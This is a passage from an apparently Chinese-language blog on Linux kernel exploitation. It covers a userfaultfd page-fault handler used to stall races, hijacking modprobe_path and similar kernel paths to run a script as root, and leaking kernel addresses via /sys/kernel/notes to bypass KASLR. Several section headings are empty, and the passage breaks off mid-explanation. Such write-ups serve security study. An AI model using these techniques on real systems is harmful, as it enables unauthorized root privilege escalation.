class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * [在这停顿.jpg]</span></span><br><span class="line"><span class="comment">         * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="setxattr-userfaultfd"><a href="#setxattr-userfaultfd" class="headerlink" title="setxattr + userfaultfd"></a>setxattr + userfaultfd</h2><h2 id="FUSE-race"><a href="#FUSE-race" class="headerlink" title="FUSE race"></a>FUSE race</h2><h2 id="punch-hole"><a href="#punch-hole" class="headerlink" title="punch hole"></a>punch hole</h2><h3 id="利用思路-33"><a href="#利用思路-33" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-31"><a href="#exp-31" class="headerlink" title="exp"></a>exp</h3><h1 id="Kernel-Trick"><a href="#Kernel-Trick" class="headerlink" title="Kernel Trick"></a>Kernel Trick</h1><h2 id="修改符号链接"><a href="#修改符号链接" class="headerlink" title="修改符号链接"></a>修改符号链接</h2><blockquote>
<p>与modprobe_path类似，还有core_pattern，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位，默认 core_pattern = core</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">validate_coredump_safety</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COREDUMP</span></span><br><span class="line">	<span class="keyword">if</span> (suid_dumpable == SUID_DUMP_ROOT &amp;&amp;</span><br><span class="line">	    core_pattern[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span> &amp;&amp; core_pattern[<span class="number">0</span>] != <span class="string">&#x27;|&#x27;</span>) &#123;</span><br><span class="line">		printk(KERN_WARNING</span><br><span class="line"><span class="string">&quot;Unsafe core_pattern used with fs.suid_dumpable=2.\n&quot;</span></span><br><span class="line"><span class="string">&quot;Pipe handler or fully qualified core dump path required.\n&quot;</span></span><br><span class="line"><span class="string">&quot;Set kernel.core_pattern before fs.suid_dumpable.\n&quot;</span></span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>poweroff_cmd，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位，默认 poweroff_cmd = /sbin/poweroff</span></span><br><span class="line">__int64 <span class="title function_">poweroff_work_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// bl</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = poweroff_force;</span><br><span class="line">  result = run_cmd(poweroff_cmd);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FFFFFFFF81CB2888);</span><br><span class="line">      emergency_sync();</span><br><span class="line">      <span class="keyword">return</span> kernel_power_off();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>uevent_helper，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位，默认不进行初始化。</span></span><br><span class="line">__int64 <span class="title function_">uevent_helper_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v1 + <span class="number">1</span>) &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-2LL</span>;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  v3 = <span class="built_in">memcpy</span>(uevent_helper, v0, v1);</span><br><span class="line">  uevent_helper[v2] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || *(_BYTE *)(v3 + v2 - <span class="number">1</span>) != <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  *(_BYTE *)(v3 + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>等也可以被修改。</p>
<p>当<code>CONFIG_STATIC_USERMODEHELPER_PATH=&quot;y&quot;</code>被设置后，无法使用这些方法。</p>
</blockquote>
<p>当能够任意地址分配的时候，与 glibc 改 hook 类似，在内核中通常修改的是 <code>modprobe_path</code> 。<code>modprobe_path</code> 是内核中的一个变量，其值为 <code>/sbin/modprobe</code> ，因此对于缺少符号的内核文件可以通过搜索 <code>/sbin/modprobe</code> 字符串的方式定位这个变量。</p>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行。<br>我们不难想到的是：若是我们能够劫持 <code>modprobe_path</code>，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，内核将会以 root 权限执行我们的恶意脚本。</p>
<p>或者分析<code>vmlinux</code>即可(对于一些没有<code>call_modprobe()</code>符号的直接交叉引用即可)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 _request_module(</span><br><span class="line">        <span class="type">char</span> a1,</span><br><span class="line">        __int64 a2,</span><br><span class="line">        <span class="type">double</span> a3,</span><br><span class="line">        <span class="type">double</span> a4,</span><br><span class="line">        <span class="type">double</span> a5,</span><br><span class="line">        <span class="type">double</span> a6,</span><br><span class="line">        <span class="type">double</span> a7,</span><br><span class="line">        <span class="type">double</span> a8,</span><br><span class="line">        <span class="type">double</span> a9,</span><br><span class="line">        <span class="type">double</span> a10,</span><br><span class="line">        ...)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">      v21 = call_usermodehelper_setup(</span><br><span class="line">              (__int64)&amp;byte_FFFFFFFF82444700, <span class="comment">// modprobe_path</span></span><br><span class="line">              (__int64)v18,</span><br><span class="line">              (__int64)&amp;off_FFFFFFFF82444620,</span><br><span class="line">              <span class="number">3264</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              (__int64)free_modprobe_argv,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">.data:FFFFFFFF82444700 byte_FFFFFFFF82444700             ; DATA XREF: __request_module:loc_FFFFFFFF8108C6D8↑r</span><br><span class="line">.data:FFFFFFFF82444700                 db <span class="number">2F</span>h  ; /       ; __request_module+<span class="number">14B</span>↑o ...                       </span><br><span class="line">.data:FFFFFFFF82444701                 db  <span class="number">73</span>h ; s</span><br><span class="line">.data:FFFFFFFF82444702                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF82444703                 db  <span class="number">69</span>h ; i</span><br><span class="line">.data:FFFFFFFF82444704                 db  <span class="number">6</span>Eh ; n</span><br><span class="line">.data:FFFFFFFF82444705                 db  <span class="number">2F</span>h ; /</span><br><span class="line">.data:FFFFFFFF82444706                 db  <span class="number">6</span>Dh ; m</span><br><span class="line">.data:FFFFFFFF82444707                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF82444708                 db  <span class="number">64</span>h ; d</span><br><span class="line">.data:FFFFFFFF82444709                 db  <span class="number">70</span>h ; p</span><br><span class="line">.data:FFFFFFFF8244470A                 db  <span class="number">72</span>h ; r</span><br><span class="line">.data:FFFFFFFF8244470B                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF8244470C                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF8244470D                 db  <span class="number">65</span>h ; e</span><br><span class="line">.data:FFFFFFFF8244470E                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h2 id="从内存搜索-flag"><a href="#从内存搜索-flag" class="headerlink" title="从内存搜索 flag"></a>从内存搜索 flag</h2><h2 id="从-sys-kernel-notes-泄露内核地址"><a href="#从-sys-kernel-notes-泄露内核地址" class="headerlink" title="从 &#x2F;sys&#x2F;kernel&#x2F;notes 泄露内核地址"></a>从 &#x2F;sys&#x2F;kernel&#x2F;notes 泄露内核地址</h2><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/ABI/stable/sysfs-kernel-notes"><code>/sys/kernel/notes</code></a> 的内容是当前运行的 vmlinux 镜像的 <code>.notes</code> 节，里面存有内核函数 <code>hypercall_page</code> 的地址。此信息可用于绕过 KASLR 保护。</p>
<p>对于 OLK-6.6 的 x86 内核，若编译时开启了 <code>CONFIG_XEN</code> 选项，则 <code>arch/x86/xen/xen-head.S</code> 会将汇编函数 <code>hypercall_page</code> 加入到 vmlinux 镜像的 <code>.note.Xen</code> 节：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arch/x86/xen/xen-head.S</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It is included in arch/x86/kernel/head_64.S:</span></span><br><span class="line"><span class="comment"> *     #include &quot;../../x86/xen/xen-head.S&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN</span></span><br><span class="line">SYM_CODE_START(hypercall_page)</span><br><span class="line">	...</span><br><span class="line">SYM_CODE_END(hypercall_page)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* .note.Xen */</span></span><br><span class="line">	ELFNOTE(Xen, XEN_ELFNOTE_HYPERCALL_PAGE, _ASM_PTR hypercall_page)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>链接脚本 <code>arch/x86/kernel/vmlinux.lds.S</code> 中指出，vmlinux 的 <code>.notes</code> 节由各链接文件的 <code>.note.*</code> 节组合形成：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arch/x86/kernel/vmlinux.lds.S */</span></span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">	.text : ... &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* include/asm-generic/vmlinux.lds.h */</span></span><br><span class="line">	RO_DATA(PAGE_SIZE) --(expand)--&gt; NOTES --(expand)--&gt;</span><br><span class="line">		.notes : ... &#123;</span><br><span class="line">			BOUNDED_SECTION_BY(.note.*, _notes)</span><br><span class="line">		&#125;</span><br><span class="line">	.data : ... &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 生成 arch/x86/kernel/vmlinux.lds 中的：</span></span><br><span class="line"><span class="comment"> .notes : AT(ADDR(.notes) - 0xffffffff80000000) &#123; __start_notes = .; KEEP(*(.note.*)) __stop_notes = .; &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>在链接生成可执行的 vmlinux 时，<code>arch/x86/Makefile</code> 指定了链接器选项 <code>--emit-relocs</code>：</p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ifdef</span> CONFIG_X86_NEED_RELOCS</span><br><span class="line">LDFLAGS_vmlinux := --emit-relocs --discard-none</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">LDFLAGS_vmlinux :=</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure></div>

<p>该选项为 vmlinux 中所有涉及<em>重定位（Relocation）</em>的节生成对应的 <code>.rela.*</code> 节。由于 <code>.notes</code> 节带有 <code>hypercall_page</code>，而后者是一个全局符号涉及重定位，因此会生成 <code>.rela.notes</code> 节。注意 <code>rela.notes</code> 的 <code>.info</code> 字段（即下方的 <code>Inf</code>）的值为 22，为 <code>.notes</code> 的序号。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -SW vmlinux</span><br><span class="line">[Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al</span><br><span class="line">...</span><br><span class="line">[22] .notes            NOTE            ffffffff8255a2fc 175a2fc 0000f0 00   A  0   0  4</span><br><span class="line">[23] .rela.notes       RELA            0000000000000000 18571990 000018 18   I 81  22  8</span><br></pre></td></tr></table></figure></div>

<p><strong>“链接后”阶段</strong></p>
<p>vmlinux 完成链接并生成后，<code>arch/x86/Makefile.postlink</code> 会被触发。此文件的开头注释解释了这一<em>阶段（Pass）</em>的工作：</p>
<blockquote>
<ol>
<li>Separate relocations from vmlinux into vmlinux.relocs.</li>
<li>Strip relocations from vmlinux.</li>
</ol>
</blockquote>
<p>具体体现为该文件中 <code>$(call cmd,relocs)</code> 和 <code>$(call cmd,strip_relocs)</code> 两个过程：</p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CMD_RELOCS = arch/x86/tools/relocs</span><br><span class="line">OUT_RELOCS = arch/x86/boot/compressed</span><br><span class="line">quiet_cmd_relocs = RELOCS  <span class="variable">$(OUT_RELOCS)</span>/<span class="variable">$@</span>.relocs</span><br><span class="line">      cmd_relocs = \</span><br><span class="line">        mkdir -p <span class="variable">$(OUT_RELOCS)</span>; \</span><br><span class="line">        <span class="variable">$(CMD_RELOCS)</span> <span class="variable">$@</span> &gt; <span class="variable">$(OUT_RELOCS)</span>/<span class="variable">$@</span>.relocs; \</span><br><span class="line">        <span class="variable">$(CMD_RELOCS)</span> --abs-relocs <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># scripts/Makefile.lib</span></span><br><span class="line">quiet_cmd_strip_relocs = RSTRIP  <span class="variable">$@</span></span><br><span class="line">      cmd_strip_relocs = \</span><br><span class="line">        <span class="variable">$(OBJCOPY)</span> --remove-section=&#x27;.rel.*&#x27; --remove-section=&#x27;.rel__*&#x27; \</span><br><span class="line">                   --remove-section=&#x27;.rela.*&#x27; --remove-section=&#x27;.rela__*&#x27; <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># `@true` prevents complaint when there is nothing to be done</span></span><br><span class="line"></span><br><span class="line"><span class="section">vmlinux: FORCE</span></span><br><span class="line">        @true</span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CONFIG_X86_NEED_RELOCS)</span>,y)</span><br><span class="line">        <span class="variable">$(<span class="built_in">call</span> cmd,relocs)</span></span><br><span class="line">        <span class="variable">$(<span class="built_in">call</span> cmd,strip_relocs)</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure></div>

<p>重点关注 <code>relocs</code> 过程，将 <code>cmd_relocs</code> 中的 Makefile 语句展开后得到如下 Bash 命令：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="built_in">arch</span>/x86/boot/compressed</span><br><span class="line"><span class="built_in">arch</span>/x86/tools/relocs vmlinux &gt; <span class="built_in">arch</span>/x86/boot/compressed/vmlinux.relocs</span><br><span class="line"><span class="built_in">arch</span>/x86/tools/relocs --abs-relocs vmlinux</span><br></pre></td></tr></table></figure></div>

<p>通过解读 <code>arch/x86/tools/relocs</code> 工具的源码，其实质是按照 ELF 格式解析 vmlinux，通过节头表（Section Header）遍历所有的节，找到其中的 <code>.rela</code> 节并从 <code>r_offset</code> 中获取所有<em>需要被重定位修改的代码地址</em>，将这些地址罗列成一个列表 <code>relocs64</code>，并最终将其输出形成 <code>vmlinux.relocs</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_reloc64</span><span class="params">(..., Elf_Rel *rel, ...)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> r_type = ELF64_R_TYPE(rel-&gt;r_info);</span><br><span class="line">	ElfW(Addr) offset = rel-&gt;r_offset;</span><br><span class="line">	<span class="keyword">switch</span> (r_type) &#123;</span><br><span class="line">	<span class="keyword">case</span> R_X86_64_64:</span><br><span class="line">		add_reloc(&amp;relocs64, offset);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">emit_relocs</span><span class="params">(<span class="type">int</span> as_text, <span class="type">int</span> use_real_mode)</span> &#123;</span><br><span class="line">	do_reloc = do_reloc64;</span><br><span class="line">	walk_relocs(do_reloc); <span class="comment">// iterate through all sections, process those of .rela</span></span><br><span class="line">	sort_relocs(&amp;relocs64);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; relocs64.count; i++)</span><br><span class="line">		write_reloc(relocs64.offset[i], <span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>随后，根据 <code>arch/x86/boot/compressed/Makefile</code>，将 <code>vmlinux.bin</code> 与 <code>vmlinux.relocs</code> 前后拼接在一起形成 <code>vmlinux.bin.all</code>，并最终经过压缩形成内核镜像产物。</p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vmlinux.bin is:</span></span><br><span class="line"><span class="comment">#       vmlinux stripped of debugging and comments</span></span><br><span class="line"><span class="comment"># vmlinux.bin.all is:</span></span><br><span class="line"><span class="comment">#       vmlinux.bin + vmlinux.relocs</span></span><br><span class="line">vmlinux.bin.all-y := <span class="variable">$(obj)</span>/vmlinux.bin</span><br><span class="line">vmlinux.bin.all-<span class="variable">$(CONFIG_X86_NEED_RELOCS)</span> += <span class="variable">$(obj)</span>/vmlinux.relocs</span><br></pre></td></tr></table></figure></div>

<p><strong>实践验证方式</strong></p>
<p>可以通过编译一个简单的 C 程序，来了解重定位节的内容。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向链接器传入 --emit-relocs 选项，</span></span><br><span class="line"><span class="comment"># 生成带有重定位节的可执行文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;int main() &#123; return 0; &#125;&quot;</span> | gcc -x c - -Wl,--emit-relocs -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析重定位节，其中 .rela.text</span></span><br><span class="line"><span class="comment"># 会包含关于 main() 的重定位信息</span></span><br><span class="line">readelf -r ./a.out</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 GDB 查看其 Offset 列的地址，可以看到</span></span><br><span class="line"><span class="comment"># 就是 start() 调用 main() 的位置</span></span><br></pre></td></tr></table></figure></div>

<p><strong>内核启动阶段</strong></p>
<p>在完成建立早期页表、进入 64 位模式等一系列工作后，执行流转入内核镜像自带的解压器，开始执行解压内核的工作，即 <code>arch/x86/boot/compressed/misc.c</code> 中的 <code>extract_kernel()</code>。此过程涉及内核地址随机化（KASLR）：</p>
